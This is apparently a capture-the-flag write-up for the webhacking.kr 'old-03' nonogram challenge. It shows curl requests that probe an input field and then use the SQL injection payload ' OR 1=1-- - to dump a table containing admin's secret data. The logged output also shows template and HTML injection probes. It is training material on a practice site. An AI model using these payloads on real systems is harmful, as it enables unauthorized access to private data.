# Old 03    Nonogram (SQLi)

URL: [https://webhacking.kr/challenge/web-03/](https://webhacking.kr/challenge/web-03/)

![old-03.png](/assets/ctf/webhacking.kr/old-03.png)

Solve the [Nonogram](https://www.wikiwand.com/en/Nonogram#Solution_techniques)

![old-03-1.png](/assets/ctf/webhacking.kr/old-03-1.png)

After solving we are redirected to following url, but looks like only `answer` was all it needed..
```d
https://webhacking.kr/challenge/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111
-
https://webhacking.kr/challenge/web-03/index.php?&_answer=1010100000011100101011111
```

![old-03-3.png](/assets/ctf/webhacking.kr/old-03-3.png)

After entering something it gets logged:

![old-03-2.png](/assets/ctf/webhacking.kr/old-03-2.png)

I wasn't able to get anything from name, so maybe it's answer?

```powershell
➜ curl 'https://webhacking.kr/challenge/web-03/index.php' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -d 'answer=1010100000011100101011111&id=y'
...
name : x<br>answer : 1010100000011100101011111<br>ip : YOUR_IP<hr>name : {{config}}<br>answer : 1010100000011100101011111<br>ip : YOUR_IP<hr>name : '<br>answer : 1010100000011100101011111<br>ip : YOUR_IP<hr>name : &lt;h1&gt;uwu&lt;h1&gt;<br>answer : 1010100000011100101011111<br>ip : YOUR_IP<hr>name : y<br>answer : 1010100000011100101011111<br>ip : YOUR_IP<hr>name : y<br>answer : 1010100000011100101011111<br>ip : YOUR_IP<hr>
...
➜ curl 'https://webhacking.kr/challenge/web-03/index.php' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -d "answer='&id=y"
...
query error!
...
➜ curl 'https://webhacking.kr/challenge/web-03/index.php' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -d "answer=' OR 1=1-- -&id=y"
...
<script>alert('old-03 Pwned!');</script><hr>old-03 Pwned. You got 35point. Congratz!<hr>name : admin<br>answer : This is admin's secret data<br>ip : localhost<hr>name : y<br>answer : ' OR 1=1-- -<br>ip : YOUR_IP<hr>
...
```

The first query was to test `curl`, then I performed SQLi test on `answer` which was successful, then most basic SQLi to fetch all results and by that we got admin's secret data.

